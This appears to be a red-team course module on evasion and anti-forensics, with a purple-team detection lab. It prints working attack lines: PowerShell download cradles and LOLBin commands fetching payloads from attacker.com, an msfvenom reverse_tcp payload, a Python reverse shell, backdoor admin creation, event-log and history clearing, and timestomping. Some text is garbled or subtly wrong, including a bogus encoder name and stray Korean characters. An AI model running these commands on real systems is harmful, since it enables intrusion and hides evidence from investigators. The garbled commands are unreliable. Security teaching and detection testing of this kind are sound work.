# Module 12: Evasion & Anti-Forensics

## Objectives
- Understand how security tools detect malicious activity
- Apply evasion techniques for payloads, traffic, and tool execution
- Use LOLBins (Living Off the Land Binaries) for stealthy operations
- Understand anti-forensic techniques and their limitations
- Understand detection engineering to improve stealth awareness

---

## 12.1 Detection Fundamentals

Stealth is not about being invisible — it's about staying below the detection threshold of the specific defenses in place. Understanding how detection works is the foundation of evasion.

### Detection Layers

| Layer | What It Detects | Examples |
|-------|----------------|----------|
| **Network** | Suspicious traffic patterns, known bad IPs, C2 beacons, exfiltration | IDS/IPS, firewall, network flow analysis, DNS monitoring |
| **Host (AV/EDR)** | Malicious files, process behavior, API calls, injections, scripts | Antivirus, EDR, AppLocker, WDAC |
| **Log-based** | Authentication anomalies, privilege escalation, suspicious commands | SIEM, Windows Event Log, Sysmon, Linux auditd |
| **Behavioral** | Anomalous user behavior, lateral movement, data access patterns | UEBA, anomaly detection |
| **Threat intelligence** | Known C2 infrastructure, IOC matching, TTP correlation | Threat feeds, attribution databases |

### The Detection Chain
For an attack to be detected, typically:
1. Something generates a signal (process creation, network connection, file access, log entry)
2. The signal is captured (by EDR, logging, network sensor)
3. The signal is analyzed (rule-based, behavioral, threat intelligence)
4. An alert is generated and investigated

Evasion targets steps 1–3: reduce signal, avoid capture, or blend in.

---

## 12.2 AV/EDR Evasion Concepts

### How AV/EDR Detects Malware

| Detection Method | Description | Evasion Approach |
|-----------------|-------------|-----------------|
| **Signature-based** | Matches files against known malware signatures | Custom code, binary modification, packing |
| **Heuristic** | Looks for patterns common in malware (API calls, behaviors) | Reduce suspicious API calls, use legitimate tools |
| **Behavioral** | Monitors runtime behavior (process injection, hooking, persistence) | Use trusted processes, avoid suspicious sequences |
| **Memory scanning** | Scans process memory for malicious code | Fileless execution, in-memory-only payloads |
| **Sandbox analysis** | Runs files in a sandbox to observe behavior | Time delays, environment checks, anti-sandbox |
| **Machine learning** | Models that classify files/behaviors as malicious | Obfuscation, polymorphism, adversarial inputs |

### Practical Evasion Techniques

#### Payload Obfuscation
```bash
# msfvenom with encoding (basic, rarely effective against modern AV)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.1.10 LPORT=4444 \
  -e x86/shikata_netware -f exe -o payload.exe

# Custom encoding / packing
# Use UPX (packer), but note many AVs detect UPX-packed malware
upx -9 payload.exe

# Manually obfuscate PowerShell
# Instead of: IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/ps1')
# Use: $a='DownloadSt';$b='ring';$c='http://attacker.com/ps1';IEX (New-Object Net.WebClient).("$a$b"($c))
```

**Important:** Simple encoding and packing is rarely effective against modern EDR. Real evasion requires understanding what specifically is being detected and targeting that.

#### Process Injection and Hollowing
Running malicious code inside a legitimate process is a common evasion technique.

```bash
# Meterpreter process migration
migrate <PID>   # Move meterpreter to another process

# Process hollowing (advanced — requires custom tooling)
# 1. Create a legitimate process in suspended state
# 2. Unmap its memory
# 3. Write malicious payload into the process space
# 4. Resume the process — it now runs your code under a trusted name
```

#### Named Pipe and Inter-Process Communication
Using named pipes for C2 communication can blend in with legitimate Windows IPC traffic.

#### AMSI Bypass
Windows Anti-Malware Scan Interface (AMSI) scans scripts (PowerShell, VBScript, JavaScript) for malicious content before execution.

```powershell
# AMSI bypass techniques (these are well-known and likely detected themselves)
# Example: patch AMSI.dll in memory to always return "clean"
# This is a cat-and-mouse game — bypasses are quickly detected

# A more effective approach: avoid triggering AMSI entirely
# - Use obfuscated commands that don't match detection patterns
# - Break up suspicious strings
# - Use lower-level APIs instead of PowerShell where possible
```

---

## 12.3 LOLBins (Living Off the Land Binaries)

LOLBins are legitimate system binaries that can be abused for malicious purposes. Because they're signed by Microsoft and commonly used, they often fly under the radar of AV/EDR.

### Why LOLBins Work
- **Trusted:** Signed by Microsoft, commonly present on systems
- **Allowed:** Often excluded from strict application control policies
- **Powerful:** Many can execute code, download files, or manipulate the system
- **Observable:** The same properties that make them useful for evasion also make them detectable if someone is looking

### Common LOLBins

| Binary | Abuse | Example |
|--------|-------|---------|
| **powershell.exe** | Script execution, C2, lateral movement | `powershell -EncodedCommand <base64>` |
| **cmd.exe / cmd** | Command execution, scripting | `cmd /c "command"` |
| **mshta.exe** | Run HTA files (HTML application) — can execute VBScript/JS | `mshta http://attacker.com/payload.hta` |
| **wscript.exe / cscript.exe** | Run VBScript/JavaScript | `wscript http://attacker.com/payload.vbs` |
| **regsvr32.exe** | Register/unregister DLLs — can load malicious DLLs | `regsvr32 /s /n /u /i:http://attacker.com/payload.dll scrobj.dll` |
| **rundll32.exe** | Run functions from DLLs | `rundll32.exe http://attacker.com/payload.dll,EntryPoint` |
| **certutil.exe** | Download files, encode/decode | `certutil -urlcache -split -f http://attacker.com/payload.exe` |
| **bitsadmin.exe** | Download files via BITS | `bitsadmin /transfer myjob /download /priority normal http://attacker.com/payload.exe C:\Windows\Temp\payload.exe` |
| **wmic.exe** | Remote execution, process creation, reconnaissance | `wmic /node:10.10.1.101 process call create "cmd.exe /c calc.exe"` |
| **psexec.exe (Sysinternals)** | Remote execution (if present or downloadable) | `psexec \\10.10.1.101 -u user -p pass cmd` |
| **schtasks.exe** | Create scheduled tasks for persistence or execution | `schtasks /create /tn "Update" /tr "cmd /c payload.exe" /sc onlogon` |
| **net.exe** | User/group management, service manipulation | `net user hacker password123 /add && net localgroup administrators hacker /add` |
| **ping.exe / tracert.exe** | Can be used with ICMP tunneling (if custom tool) | Not directly, but ICMP tunnel tools leverage these protocols |
| **fsutil.exe** | File system manipulation, can create files | `fsutil file createnew C:\Windows\Temp\payload.exe 0` (creates 0-byte file) |
| **takeown.exe / icacls.exe** | Take ownership and modify permissions | Escalate access to files/services |

### LOLBin Detection
Defenders specifically hunt for LOLBin abuse:
- **Command line logging:** Sysmon Event ID 1 captures command line arguments — suspicious parameters are visible
- **Parent-child analysis:** `cmd.exe` spawned by a word processor? Suspicious.
- **Network monitoring:** `certutil` making outbound connections is unusual
- **Behavioral detection:** LOLBins doing things they don't normally do

### LOLBin Selection Strategy
1. **Identify what's available** on the target system
2. **Check which are monitored** (e.g., if Sysmon is running, any LOLBin with suspicious args is logged)
3. **Choose the least suspicious option** — `certutil` for download may be less suspicious than `powershell -EncodedCommand`
4. **Combine with other techniques** — run the LOLBin from a trusted parent process, at a quiet time, with obfuscated arguments

---

## 12.4 Script Evasion

### PowerShell Evasion

PowerShell is heavily monitored but extremely powerful. The goal is to accomplish objectives while minimizing detectable patterns.

**Basic obfuscation:**
```powershell
# Base64 encode the entire script
$command = "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/ps1')"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [System.Convert]::ToBase64String($bytes)
powershell -EncodedCommand $encoded

# Break up strings to avoid detection
$user = "admin"
$pass = "P@ss" + "w0rd"
$creds = $user + ":" + $pass
```

**Constrained Language Mode bypass (if you can):**
```powershell
# PowerShell's Constrained Language Mode limits what you can do
# Bypassing it requires finding a way to set $ExecutionContext.SessionState.LanguageMode = "FullLanguage"
# This is heavily monitored — do it only if necessary and understand the risk
```

**Logging considerations:**
- **Script Block Logging:** Logs the de-obfuscated script block — obfuscation doesn't help if this is enabled
- **Module Logging:** Logs PowerShell module usage
- **Transcription:** Logs all input and output to a file

If these are enabled, PowerShell evasion is much harder. The best approach is to minimize PowerShell use or use it in ways that don't trigger alerts.

### VBScript and HTA
Older but still effective. Many environments don't monitor VBScript as closely as PowerShell.

```vbscript
' VBScript reverse shell (simplified)
Set sock = CreateObject("WScript.Shell")
Set objSocket = CreateObject("MSWinsock.Winsock")
' ... socket programming to connect back and execute commands
```

```html
<!-- HTA (HTML Application) -->
<!-- Runs with mshta.exe — can contain VBScript or JavaScript -->
<HTA:APPLICATION ID="oHTA" />
<script>
  var shell = new ActiveXObject("WScript.Shell");
  shell.Run("cmd.exe /c whoami > %TEMP%\\result.txt");
</script>
```

### Python and Other Interpreters
If Python is installed on the target, it can be used similarly to PowerShell.

```python
# Python reverse shell
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.1.10",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

---

## 12.5 Network Evasion

### C2 Traffic Evasion

Command and control traffic is one of the primary detection targets. Making C2 traffic blend in is critical for stealth.

| Technique | Description | Effectiveness |
|-----------|-------------|---------------|
| **Standard ports** | Use ports 80, 443, 53 — blend with normal traffic | Moderate — portalone is weak |
| **HTTPS encryption** | Encrypt C2 over TLS — inspectable only via TLS inspection | Strong against network inspection |
| **Domain fronting** | C2 traffic appears to go to one domain but is routed to another | Moderate — major providers have blocked this |
| **Domain generation algorithms (DGA)** | Generate many domains, use one as C2 — hard to block all | Moderate — ML-based DGA detection exists |
| **Beaconing with jitter** | Add random delay to beacons to avoid regular pattern detection | Moderate — helps avoid simple pattern detection |
| **Low-and-slow** | Minimize traffic volume, spread over time | Moderate — reduces signal but may increase detection window |
| **Peer-to-peer C2** | No central C2 server — harder to disrupt and detect | Strong but complex |
| **Social media / cloud as C2** | Use Twitter, GitHub, Google Drive, etc. as C2 channel | Strong against traditional network monitoring |
| **DNS tunneling** | Encode C2 data in DNS queries/responses | Moderate — DNS monitoring is improving |

### Traffic Blending
- **Browse bl렌딩:** Make C2 traffic occur during normal browsing sessions
- **Protocol mimicry:** Make C2 look like legitimate protocol traffic (HTTP, DNS, etc.)
- **Timing:** Send C2 traffic during busy periods when anomalous traffic is less noticeable

### Firewall Evasion
- **Egress filtering:** If only HTTP/HTTPS is allowed out, use HTTP/HTTPS C2
- **DNS allowed:** DNS is almost always allowed — DNS tunneling or DNS-based C2
- **ICMP:** Sometimes allowed — ICMP tunneling (requires custom tools)
- **IPv6:** If IPv6 is enabled but not monitored, use IPv6 for C2

---

## 12.6 Anti-Forensics

Anti-forensics aims to make post-incident investigation difficult. In a red team context, this means leaving fewer traces and making any traces harder to interpret.

### Log Clearing and Modification

**Windows:**
```cmd
# Clear event logs (requires admin)
wevtutil cl Security
wevtutil cl System
wevtutil cl Application
Clear-EventLog -LogName Security, System, Application   # PowerShell

# Note: Clearing logs itself generates an event (Event ID 1102 — log cleared)
# A smart defender knows the logs were cleared and investigates why
```

**Linux:**
```bash
# Clear logs
> /var/log/auth.log
> /var/log/syslog
rm /var/log/*.log
history -c    # Clear command history
cat /dev/null > ~/.bash_history

# Note: Log clearing is itself a red flag. Absence of logs is evidence of something.
```

**Better approach than clearing:** Modify specific entries to remove evidence of your activity while leaving the rest of the logs intact. This is more subtle but also more complex. Sometimes it's better to simply not generate logs in the first place (e.g., use techniques that don't trigger logging).

### Fileless Execution

Running code without writing files to disk:

```bash
# PowerShell without files
powershell -NoP -NonI -W Hidden -Exec Bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/ps1')"

# WMI persistence without files (PowerShell)
# Store payload in WMI repository, execute via WMI event
# This is detectable (WMI activity is logged) but leaves no files

# PowerShell in memory only
# Load .NET assemblies from memory, not disk
```

### Timestomping

Modify file timestamps to hide the age or presence of files.

```cmd
# Modify timestamps (Windows)
powershell -Command "Set-ItemProperty -Path 'C:\path\to\file' -Name CreationTime -Value '2024-01-01 00:00:00'"
# Or use tools like touch, metamorphic timestamp changers

# Linux
touch -t 202401010000 /path/to/file
```

**Caution:** Timestomping itself can be detected. File system metadata changes are logged by some systems.

### Covering Tracks

- **Delete tools after use:** Remove downloaded binaries, scripts, etc.
- **Clear command history:** Bash history, PowerShell transcript, etc.
- **Remove scheduled tasks/persistence:** If persistence isn't needed, remove it after use
- **Use temporary locations:** Execute from %TEMP%, /tmp, or memory — less likely to be reviewed

---

## 12.7 Detection Engineering for Red Teams

Understanding how defenders build detections helps you test and improve evasion.

### Detection Development Process
1. **Identify the technique** (e.g., Kerberoasting, LOLBin abuse, C2 beacon)
2. **Determine what signals it generates** (process creation, network connection, log entry)
3. **Write detection rules** (SIEM query, EDR detection, IDS signature)
4. **Test the detection** — run the technique and verify the alert fires
5. **Tune the detection** — reduce false positives, ensure coverage

### Red Team Role in Detection Testing
- Run techniques against the environment
- Verify detections fire as expected
- Identify gaps where techniques go undetected
- Provide feedback to blue team on detection quality
- This is purple teaming — red and blue collaborate to improve security

### How to Test Detection Coverage
1. **Map to MITRE ATT&CK:** Identify which techniques you plan to use
2. **Check detection coverage** for each technique (if detection exists, test it; if not, report the gap)
3. **Run controlled tests** — execute the technique and observe
4. **Document results** — which techniques were detected, which weren't, why

---

## 12.8 Lab: Evasion & Anti-Forensics

### Setup
- Kali Linux (10.10.1.10)
- Windows 10 Client (10.10.1.101) — with Sysmon installed if possible (for detection visibility)
- Metasploitable 2 (10.10.1.20)
- DVWA (10.10.1.50)

### Tasks

**Task 1: Establish Detection Baseline**
1. Install Sysmon on Windows 10 client (if not already installed) with a standard configuration:
   ```cmd
   Sysmon.exe -accepteula -i sysmonconfig.xml
   ```
2. Generate some baseline activity:
   - Run normal commands (whoami, ipconfig, dir)
   - Run suspicious commands (powershell -EncodedCommand, certutil download)
3. Review Sysmon logs: what events are generated for each action?
4. Document the baseline — what does normal look like, what does suspicious look like?

**Task 2: Generate and Detect Suspicious Activity**
1. On Windows 10 client, perform these actions:
   - Run a simple reverse shell via PowerShell
   - Download a file via certutil
   - Execute a file via mshta
   - Create a scheduled task via schtasks
2. For each action, check Sysmon logs:
   - What Event IDs were generated?
   - What details are captured (command line, parent process, network connection)?
3. Document which actions were most visible and which were least visible

**Task 3: LOLBin Practice**
1. On the Windows 10 client, perform the same actions using different LOLBins:
   - Download a file: certutil, bitsadmin, regsvr32 (with URL), mshta
   - Execute code: powershell, wscript, rundll32, mshta
   - Execute remotely: wmic, psexec (if available)
2. Compare detection: which LOLBins generated the most/least log activity?
3. Document your findings on LOLBin stealth characteristics

**Task 4: PowerShell Obfuscation**
1. Write a simple PowerShell script (e.g., a reverse shell or file downloader)
2. Create multiple obfuscated versions:
   - Base64 encoded (`-EncodedCommand`)
   - String concatenation and variable manipulation
   - Character substitution (replace 'a' with '`' + 'a')
3. Run each version and observe:
   - Does Script Block Logging show the de-obfuscated version?
   - Does the AV/EDR flag any versions?
   - What is logged in Sysmon?
4. Document what obfuscation helped and what didn't (with Script Block Logging enabled, most obfuscation eventually de-obfuscates)

**Task 5: C2 Traffic Analysis**
1. Start a simple C2 listener (e.g., a basic HTTP listener or Metasploit handler)
2. Generate C2 traffic from the Windows client:
   - Regular beacons at fixed intervals
   - Beacons with jitter (random delay)
   - HTTPS beacons (if possible)
3. Capture traffic on Kali with tcpdump or Wireshark:
   ```
   tcpdump -i eth0 -w c2_traffic.pcap
   ```
4. Analyze the PCAP:
   - Can you identify the beacon pattern?
   - Can you distinguish C2 traffic from normal HTTP traffic?
   - What would a network defender see?
5. Document traffic characteristics and detection potential

**Task 6: Anti-Forensic Technique Testing**
1. On Windows 10 client:
   - Create a file, then clear it (cipher /w or sdelete if available, or simple deletion)
   - Clear the event log (Security or Sysmon)
   - Clear the PowerShell history
   - Modify file timestamps (timestomping)
2. For each technique:
   - What traces remain?
   - What events were generated by the anti-forensic action itself?
   - How would a forensic analyst detect your attempts?
3. Document the effectiveness and limitations of each technique

**Task 7: Detection Gap Identification**
1. Review all techniques you've tested against the lab's defenses:
   - Which techniques were detected?
   - Which techniques went undetected (or generated only low-severity alerts)?
2. For undetected techniques, hypothesize why:
   - Was the logging not capturing the right data?
   - Was the detection rule not written for this specific pattern?
   - Did the technique blend in with legitimate activity?
3. Write detection recommendations for any gaps found:
   - What should be logged?
   - What rule or alert should fire?
   - What response should follow?

**Task 8: Purple Team Exercise**
1. Simulate a specific ATT&CK technique (e.g., T1059 — PowerShell, T1003 — Credential Dumping, T1021 — Lateral Movement)
2. Run the technique in the lab
3. Monitor with Sysmon and any other tools available
4. Determine: did it get detected? If yes, how? If no, why not?
5. Provide feedback: what detection would have caught this? What detection would reduce false positives while maintaining coverage?

---

## 12.9 Expected Outcomes

By the end of this module, you should be able to:
- Explain how AV/EDR/NIDS detect malicious activity
- Use LOLBins for stealthy execution and explain their detection profile
- Apply basic payload obfuscation and understand its limits
- Analyze C2 traffic characteristics and detection potential
- Apply anti-forensic techniques and understand their effectiveness
- Contribute to detection engineering through purple teaming

---

## 12.10 Assessment Criteria

| Criteria | Points | Description |
|----------|--------|-------------|
| Detection baseline | 5 | Establishes and documents what normal vs. suspicious looks like |
| LOLBin analysis | 10 | Compares multiple LOLBins, documents detection profile of each |
| PowerShell obfuscation | 10 | Creates multiple obfuscated versions, analyzes detection impact |
| C2 traffic analysis | 10 | Analyzes beacon traffic, identifies detection characteristics |
| Anti-forensics testing | 10 | Tests log clearing, timestomping, file deletion; analyzes residual traces |
| Detection gap identification | 10 | Identifies gaps and proposes detection improvements |
| Report quality | 10 | Professional documentation of techniques, results, analysis |
| **Total** | **65** | |

**Pass threshold:** 45/65 (69%)

### Report Requirements (4–5 pages)
1. Detection environment overview — tools in place (Sysmon config, AV/EDR status, logging)
2. LOLBin comparison — which binaries were tested, their command lines, detection results
3. Obfuscation analysis — which techniques reduced detectability, which didn't, why
4. C2 traffic analysis — beacon patterns, visibility in packet capture, blending assessment
5. Anti-forensic effectiveness — what traces remain after each technique, what a forensic analyst would find
6. Detection recommendations — specific rules, logging improvements, monitoring suggestions
7. Purple team observations — what worked, what didn't, lessons for both red and blue
